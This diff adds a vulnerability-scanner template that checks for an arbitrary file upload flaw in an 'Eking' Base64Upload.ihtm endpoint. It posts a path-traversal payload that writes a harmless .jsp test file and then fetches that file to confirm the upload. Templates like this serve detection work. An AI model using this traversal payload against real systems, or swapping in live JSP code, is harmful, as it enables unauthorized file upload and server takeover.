@@ -1,0 +1,42 @@
+id: eking-base64upload-file-upload
+info:
+  name: Eking Base64Upload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(100, 1000)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Base64Upload.ihtm"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      base64_str=data:image//../../../test{{t1}}.jsp.;base64,dGVzdDEyM3Rlc3Q=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(find_json(body, 'fileUrl'), '.jsp')
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/test{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "test123test"
